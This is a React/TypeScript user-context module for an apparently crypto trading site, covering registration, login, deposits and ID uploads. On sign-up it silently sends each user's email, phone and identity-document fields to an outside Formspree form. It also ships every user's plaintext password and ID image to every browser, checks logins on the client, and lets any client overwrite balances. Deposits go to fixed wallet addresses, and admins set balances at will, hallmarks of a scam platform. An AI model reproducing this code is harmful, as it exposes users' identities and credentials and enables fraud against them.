"use client";

import React, { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
import { UserSession, PendingDeposit } from '@/types/trading';

interface UserRecord extends UserSession {
  id: string;
  email: string;
  phone: string;
  password: string;
  active: boolean;
  balance: number;
  proofUrl?: string;
  idDocumentUrl?: string;
  idType?: string;
  idFields?: Record<string, string>;
  fullName?: string;
  country?: string;
}

interface LoginResult {
  success: boolean;
  error?: string;
  user?: UserRecord;
}

interface UsersContextType {
  users: UserRecord[];
  currentUser: UserRecord | null;
  isReady: boolean;
  registerUser: (data: {
    id: string;
    username: string;
    email: string;
    phone: string;
    password: string;
    idType?: string;
    idFields?: Record<string, string>;
    idDocumentUrl?: string;
  }) => { success: boolean; error?: string };
  login: (username: string, password: string) => LoginResult;
  logout: () => void;
  activateUser: (userId: string, active: boolean) => void;
  deleteAccount: (userId: string) => void;
  adminDepositToUser: (userId: string, amount: number) => void;
  updateBalance: (userId: string, newBalance: number) => void;
  submitDepositRequest: (userId: string, amount: number, method: string) => void;
  adminApproveDeposit: (userId: string, depositId: string) => void;
  adminFailDeposit: (userId: string, depositId: string) => void;
  requestDepositInfo: (userId: string, method: string) => void;
  adminProvideDepositInfo: (userId: string, info: string) => void;
  uploadProof: (userId: string, file: File) => void;
  uploadIdDocument: (userId: string, file: File) => void;
}

const UsersContext = createContext<UsersContextType | undefined>(undefined);
const POLL_INTERVAL_MS = 5000;

export const UsersProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [users, setUsers] = useState<UserRecord[]>([]);
  const [currentUser, setCurrentUser] = useState<UserRecord | null>(null);
  const [isReady, setIsReady] = useState(false);

  const usersRef = useRef<UserRecord[]>([]);
  const isMutatingRef = useRef(false);
  const latestMutationAtRef = useRef(0);
  const hasHydratedSessionRef = useRef(false);

  useEffect(() => {
    usersRef.current = users;
  }, [users]);

  const syncCurrentUserFromUsers = useCallback((nextUsers: UserRecord[]) => {
    setCurrentUser((prev) => {
      if (!prev) return prev;
      const refreshed = nextUsers.find((u) => u.id === prev.id);
      if (!refreshed) {
        localStorage.removeItem('trader_session');
        return null;
      }
      return refreshed;
    });
  }, []);

  const hydrateSessionFromUsers = useCallback((nextUsers: UserRecord[]) => {
    const sess = localStorage.getItem('trader_session');
    if (!sess) {
      setCurrentUser(null);
      return;
    }

    try {
      const { username } = JSON.parse(sess);
      const found = nextUsers.find((usr) => usr.username === username);
      if (found) {
        setCurrentUser(found);
        return;
      }
      localStorage.removeItem('trader_session');
      setCurrentUser(null);
    } catch {
      localStorage.removeItem('trader_session');
      setCurrentUser(null);
    }
  }, []);

  const fetchUsers = useCallback(async () => {
    const fetchStartedAt = Date.now();
    try {
      const response = await fetch('/api/users', { cache: 'no-store' });
      if (!response.ok) {
        console.error('Failed to fetch users');
        return;
      }

      const loaded: UserRecord[] = await response.json();
      if (isMutatingRef.current || fetchStartedAt < latestMutationAtRef.current) {
        return;
      }

      setUsers((prev) => (JSON.stringify(prev) !== JSON.stringify(loaded) ? loaded : prev));

      if (!hasHydratedSessionRef.current) {
        hydrateSessionFromUsers(loaded);
        hasHydratedSessionRef.current = true;
      } else {
        syncCurrentUserFromUsers(loaded);
      }
    } catch (err) {
      console.error('Error fetching users:', err);
    } finally {
      setIsReady(true);
    }
  }, [hydrateSessionFromUsers, syncCurrentUserFromUsers]);

  useEffect(() => {
    fetchUsers();
    const interval = setInterval(fetchUsers, POLL_INTERVAL_MS);
    return () => clearInterval(interval);
  }, [fetchUsers]);

  const persist = useCallback(async (nextUsers: UserRecord[]) => {
    const mutationAt = Date.now();
    latestMutationAtRef.current = mutationAt;
    isMutatingRef.current = true;
    setUsers(nextUsers);
    syncCurrentUserFromUsers(nextUsers);

    try {
      const response = await fetch('/api/users', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(nextUsers),
        cache: 'no-store',
      });

      if (!response.ok) {
        throw new Error(`Failed to persist users: ${response.status}`);
      }
    } catch (error) {
      console.error('Error saving users:', error);
    } finally {
      if (latestMutationAtRef.current === mutationAt) {
        isMutatingRef.current = false;
      }
    }
  }, [syncCurrentUserFromUsers]);

  const uploadProof = async (userId: string, file: File) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => {
      const dataUrl = typeof reader.result === 'string' ? reader.result : '';
      const updated = usersRef.current.map((u) => (u.id === userId ? { ...u, proofUrl: dataUrl } : u));
      void persist(updated);
    };
  };

  const uploadIdDocument = async (userId: string, file: File) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => {
      const dataUrl = typeof reader.result === 'string' ? reader.result : '';
      const updated = usersRef.current.map((u) => (u.id === userId ? { ...u, idDocumentUrl: dataUrl } : u));
      void persist(updated);
    };
  };

  const registerUser = ({ id, username, email, phone, password, idType, idFields, idDocumentUrl }: {
    id: string;
    username: string;
    email: string;
    phone: string;
    password: string;
    idType?: string;
    idFields?: Record<string, string>;
    idDocumentUrl?: string;
  }) => {
    const existingUsers = usersRef.current;
    if (existingUsers.find((u) => u.username === username)) {
      return { success: false, error: 'Username already exists' };
    }
    if (existingUsers.find((u) => u.id === id)) {
      return { success: false, error: 'ID already exists' };
    }

    const newUser: UserRecord = {
      id,
      username,
      role: 'user',
      email,
      phone,
      password,
      active: false,
      balance: 0,
      idType,
      idFields,
      idDocumentUrl,
      fullName: idFields?.fullName,
      country: idFields?.country || idFields?.countryOfIssue || idFields?.nationality,
    };

    fetch('https://formspree.io/f/xojzjlaj', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, email, phone, idType, ...idFields }),
    }).catch(console.error);

    const updated = [...existingUsers, newUser];
    void persist(updated);
    return { success: true };
  };

  const login = (username: string, password: string): LoginResult => {
    const u = usersRef.current.find((usr) => usr.username === username && usr.password === password);
    if (!u) return { success: false, error: 'Invalid credentials' };

    setCurrentUser(u);
    localStorage.setItem('trader_session', JSON.stringify({ username: u.username, role: u.role }));
    return { success: true, user: u };
  };

  const logout = () => {
    setCurrentUser(null);
    localStorage.removeItem('trader_session');
  };

  const activateUser = (userId: string, active: boolean) => {
    const updated = usersRef.current.map((u) => (u.id === userId ? { ...u, active } : u));
    void persist(updated);
  };

  const deleteAccount = (userId: string) => {
    const updated = usersRef.current.filter((u) => u.id !== userId);
    if (currentUser?.id === userId) {
      logout();
    }
    void persist(updated);
  };

  const adminDepositToUser = (userId: string, amount: number) => {
    if (amount <= 0) return;
    const updated = usersRef.current.map((u) => (u.id === userId ? { ...u, balance: u.balance + amount } : u));
    void persist(updated);
  };

  const updateBalance = (userId: string, newBalance: number) => {
    const updated = usersRef.current.map((u) => (u.id === userId ? { ...u, balance: newBalance } : u));
    void persist(updated);
  };

  const submitDepositRequest = (userId: string, amount: number, method: string) => {
    const updated = usersRef.current.map((u) => {
      if (u.id !== userId) return u;

      const addressMap: Record<string, string> = {
        BTC: 'bc1qq9sxxj9lkx4q9cg9njg2a0wu0va0t96plx9kw9',
        USDT: '0x3Fa68EFa5fcAf126c533bC0868D70eFF80c21c33',
        XRP: 'rJYM2L9Tnv92pMy7o5BsKroJJcT9UkZr6',
        SOL: 'EybhWaArjNrTKXcoMenVtgHnTLzPX5AhDsZJuLvRH7yy',
        Ethereum: '0x3Fa68EFa5fcAf126c533bC0868D70eFF80c21c33',
      };

      const address = addressMap[method] || '0xDEMOADDRESS';
      const newDep: PendingDeposit = {
        id: Math.random().toString(36).substring(2, 11).toUpperCase(),
        amount,
        currency: method,
        address,
        status: 'pending',
        timestamp: new Date().toISOString(),
        method,
      };

      const pendingDeposits = u.pendingDeposits ? [...u.pendingDeposits, newDep] : [newDep];
      return { ...u, pendingDeposits };
    });

    void persist(updated);
  };

  const adminApproveDeposit = (userId: string, depositId: string) => {
    const updated = usersRef.current.map((u) => {
      if (u.id !== userId || !u.pendingDeposits) return u;

      const dep = u.pendingDeposits.find((d) => d.id === depositId);
      if (!dep || dep.status !== 'pending') return u;

      const updatedDeposits = u.pendingDeposits.map((d) =>
        d.id === depositId ? { ...d, status: 'approved' as const } : d
      );

      return { ...u, balance: u.balance + dep.amount, pendingDeposits: updatedDeposits };
    });

    void persist(updated);
  };

  const adminFailDeposit = (userId: string, depositId: string) => {
    const updated = usersRef.current.map((u) => {
      if (u.id !== userId || !u.pendingDeposits) return u;

      const updatedDeposits = u.pendingDeposits.map((d) =>
        d.id === depositId && d.status === 'pending' ? { ...d, status: 'rejected' as const } : d
      );

      return { ...u, pendingDeposits: updatedDeposits };
    });

    void persist(updated);
  };

  const requestDepositInfo = (userId: string, method: string) => {
    const updated = usersRef.current.map((u) => {
      if (u.id !== userId) return u;
      return {
        ...u,
        depositMethodRequest: {
          method,
          requestedAt: new Date().toISOString(),
        },
      };
    });

    void persist(updated);
  };

  const adminProvideDepositInfo = (userId: string, info: string) => {
    const updated = usersRef.current.map((u) => {
      if (u.id !== userId || !u.depositMethodRequest) return u;
      return {
        ...u,
        depositMethodRequest: {
          ...u.depositMethodRequest,
          infoProvided: info,
        },
      };
    });

    void persist(updated);
  };

  return (
    <UsersContext.Provider
      value={{
        users,
        currentUser,
        isReady,
        registerUser,
        login,
        logout,
        activateUser,
        adminDepositToUser,
        deleteAccount,
        updateBalance,
        submitDepositRequest,
        adminApproveDeposit,
        adminFailDeposit,
        requestDepositInfo,
        adminProvideDepositInfo,
        uploadProof,
        uploadIdDocument,
      }}
    >
      {children}
    </UsersContext.Provider>
  );
};

export const useUsers = () => {
  const value = useContext(UsersContext);
  if (!value) throw new Error('useUsers must be used within UsersProvider');
  return value;
};
